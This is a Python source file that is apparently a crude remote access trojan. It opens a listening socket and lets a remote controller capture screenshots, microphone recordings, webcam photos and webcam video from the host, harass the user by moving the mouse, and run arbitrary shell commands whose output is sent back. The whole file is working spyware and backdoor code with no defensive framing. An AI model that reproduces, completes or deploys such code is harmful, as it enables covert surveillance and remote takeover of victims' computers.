import socket
import subprocess
import os
import pyscreenshot 
import pyautogui
import time
import sounddevice as sd 
from scipy.io.wavfile import write 
import wavio as wv 
import platform
from random import randint
from cv2 import *
from moviepy.editor import *
freq = 44100
duration = 10

s = socket.socket()
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003

BUFFER_SIZE = 1024
	
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
#print("listing on ",SERVER_HOST,":","SERVER_PORT") 
#print(("listning on port",SERVER_PORT))
c, addr = s.accept()
print(("Got connection from ", addr,"!!!!!"))
while True:
	data = c.recv(2024).decode()
	if not data:
		break

	while str(data) == 'screenshot':
		image = pyscreenshot.grab()		
		image.save("imagegrabber.png")
		c.send(b'capturing')
		f = open('imagegrabber.png' , 'rb')
		i = f.read(2024)
		c.send(i)
		i = f.read(2024)
		f.close()
		

		data = c.recv(2024).decode()

	while str(data) == 'irritate':
		
		t_end = time.time() + 0o3 * 0o5
		while time.time() < t_end:
			pyautogui.moveTo(600, 200)
		c.send(b'irritating')
		data = c.recv(2024).decode()
		
	
	while str(data) == 'voice-record':
		recording = sd.rec(int(duration * freq),
			samplerate=freq, channels=2)
		sd.wait()
		write("recording0.wav", freq, recording)
		wv.write("recording1.wav", recording, freq, sampwidth=2)
		c.send(b'capturing video')
		f = open('recording1.wav' , 'rb')
		i = f.read(2024)
		
		c.send(i)
		i = f.read(2024)
		f.close()
		os.remove("recording0.wav")
		
		data = c.recv(2024).decode()


	#while str(data) == 'system-info':
		#c.send('capturing info')
		#a=platform.system()
		#b=platform.release()
		#c=platform.version()					
		#d= a,b,c
		#d = str(d)
		#data = c.send(d)
		#data = 'whoami'

	while str(data) == 'webcam':

		ca = VideoCapture(0) 
		return_value, image = ca.read()
			
		cv2.imwrite("webcam.jpg",image) #save image
		del(ca)
		
		c.send(b'capturing webcam')
		f = open('webcam.jpg' , 'rb')
		i = f.read(2024)
		c.send(i)
		i = f.read(2024)
		f.close()
		data = c.recv(2024).decode()


	while str(data) == 'webcam video':
		cap = cv2.VideoCapture(0)
		fourcc = cv2.VideoWriter_fourcc(*'XVID') 
		out = cv2.VideoWriter('outputvideo.avi', fourcc, 20.0, (640, 480)) 
		t_end = time.time() + 0o3 * 0o5
		while time.time() < t_end:
			ret, frame = cap.read() 
			rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
			out.write(rgb)
		cap.release()
		out.release()
		cv2.destroyAllWindows() 
		
		c.send(b'capturing audiovideo')
		f = open('outputvideo.avi' , 'rb')
		i = f.read(2024)
		c.send(i)
		i = f.read(2024)
		f.close()
		data = c.recv(2024).decode()
		

	while str(data) == 'webcam video --villen':
#		c.send(b'typeput')
#		c.recv(2024).decode()
		
		
		cap = cv2.VideoCapture(0)
		fourcc = cv2.VideoWriter_fourcc(*'XVID') 
		out = cv2.VideoWriter('outputvideovillen.avi', fourcc, 20.0, (640, 480)) 
		t_end = time.time() + 0o3 * 0o5
		while time.time() < t_end:
			ret, frame = cap.read() 
			rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)
			out.write(rgb)
		cap.release()
		out.release()
		cv2.destroyAllWindows()

		videoclip = VideoFileClip("outputvideovillen.avi")
		audioclip = AudioFileClip("harshsound.wav")
		new_audioclip = CompositeAudioClip([audioclip])
		videoclip.audio = new_audioclip
		videoclip.write_videofile("outputvideoofvillen.mp4", logger=None)		


		c.send(b'capturing audiovideovillen')
		f = open('outputvideoofvillen.mp4' , 'rb')
		i = f.read(2024)
		c.send(i)
		i = f.read(2024)
		f.close()
		data = c.recv(2024).decode()		
				
	
	cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	cmd_bytes = cmd.stdout.read()
	cmd_str = cmd_bytes
	c.send(cmd_str)
	print((str(data)))
	

c.close()